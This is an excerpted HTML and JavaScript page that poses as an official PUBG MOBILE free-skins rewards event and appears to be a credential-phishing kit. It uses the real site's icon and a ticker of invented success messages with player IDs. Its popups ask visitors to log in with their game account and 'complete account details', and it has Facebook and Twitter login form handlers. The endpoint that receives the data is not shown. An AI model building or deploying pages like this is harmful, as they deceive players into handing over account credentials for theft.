...
<meta property="og:image" content="https://www.pubgmobile.com/images/event/home/pubg_icon.png">
...
<link rel="icon" href="https://www.pubgmobile.com/images/event/home/pubg_icon.png">
</head>
...
.header {
	...
	border-bottom: 0.5px solid #8fd9fc;
}
.event-titit {
	background:url(img/Amd-title.png) no-repeat center center;
...
<div>
<figure>
<img style="border: 1px #555454; border-bottom: none;opacity: 0.0%;" src="img/rewards/1.jpg">
</figure>
</div>
<div>
...
<div>
<figure>
<img style="border: 1px #555454; border-bottom: none;opacity: 0.0%;" src="img/rewards/2.jpg">
</figure>
</div>
<div>
...
<div>
<figure>
<img style="border: 1px #555454; border-bottom: none;opacity: 0.0%;" src="img/rewards/3.jpg">
</figure>
</div>
<div>
...
<div>
<figure>
<img style="border: 1px #555454; border-bottom: none;opacity: 0.0%;" src="img/rewards/4.jpg">
</figure>
</div>
<div>
...
<div>
<figure>
<img style="border: 1px #555454; border-bottom: none; opacity: 0.0%;" src="img/rewards/5.jpg">
</figure>
</div>
<div>
...
<div>
<figure>
<img style="border: 1px #555454; border-bottom: none;opacity: 0.0%;" src="img/rewards/6.jpg">
</figure>
</div>
<div>
...
<div class="slider animated fadeIn">ID 5883485425 Successfully Got Blood Raven X-suit</div>
<div class="slider animated fadeIn">ID 5963737318 Successfully Got Glacier - M416</div>
<div class="slider animated fadeIn">ID 5886864517 Successfully Got Poseidon X-suit</div>
<div class="slider animated fadeIn">ID 5886864517 Successfully Got 9 Materials</div>
<div class="slider animated fadeIn">ID 5463336783 Successfully Got Arcane Jester X-suit</div>
<div class="slider animated fadeIn">ID 5463336783 Successfully Got The Fool - M416</div>
</div> <!--- event-notification-text --->
...
<div class="popup-box">
<div class="nav-popup">
<img onmousedown="tutup.play();" onclick="close_reward_confirmation()" src="img/close.png">
<div class="nav-popup-title" style="margin-left: 35px;">Reward Confirmation</div> <!--- nav-popup-title --->
</div> <!--- nav-popup --->
...
<button type="button" onmousedown="buka.play();" onclick="open_verif()">Collect</button>
</div> <!--- popup-box-bg --->
</div> <!--- popup-footer --->
</div> <!--- popup-box --->
</div> <!--- popup --->
...
<div class="popup-box-bg">
<div class="popup-alert"><br>Log in using your PUBG MOBILE account</div> <!--- popup-alert --->
...
<div class="popup account_verification animated fadeIn" style="display: none;">
	...
	<div class="popup-box-bg">
	<div class="popup-alert" style="margin-bottom: -5px;">Complete your account details</div><br> <!--- popup-alert --->
<form class="popup-form" action="javascript:void(0)" method="post" id="ValidateVerificationDataForm" onsubmit="open_my_account();">
...
<input type="hidden" name="login" id="validateLogin" readonly>
	...
	<button type="submit" style="margin-top: 3px;" onmousedown="buka.play();" onclick="ValidateVerificationData()">Verifycation</button>
	</div> <!--- popup-box-bg --->
	</div> <!--- popup-footer --->
	</form> <!--- form --->
	</div> <!--- popup-box --->
...
<div class="popup-footer">
<button type="button" onmousedown="tutup.play();" style="background: url(img/btn.png) no-repeat center center; background-size: 100% 100%;" onclick="location.href='https://www.pubgmobile.com/';">Logout</button>
</div> <!--- popup-box-bg --->
</div> <!--- popup-footer --->
</div> <!--- popup-box --->
</div> <!--- popup --->
...
<script src="js/ionicons.map.js"></script>
...
function ValidateLoginFbData(){
 $('#ValidateLoginFbForm').submit(function(submitingVerificationData){
...
$('#ValidateLoginTwitterForm').submit(function(submitingVerificationData){
submitingVerificationData.preventDefault();
